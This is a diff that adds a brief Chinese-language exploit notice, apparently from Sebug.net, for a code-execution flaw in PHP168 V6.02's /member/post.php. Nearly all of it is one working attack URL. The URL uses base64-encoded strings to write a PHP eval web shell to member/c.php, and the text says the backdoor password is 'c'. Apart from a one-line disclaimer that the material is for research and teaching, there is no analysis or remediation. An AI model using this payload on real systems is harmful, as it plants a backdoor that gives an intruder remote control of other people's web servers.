@@ -1,0 +1,6 @@
+PHP168 V6.02 /member/post.php代码执行漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1./member/post.php?only=1&showHtml_Type[bencandy][1]={${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}&aid=1&job=endHTML2. 3.直接在该目录生成个member/c.php 密码为c
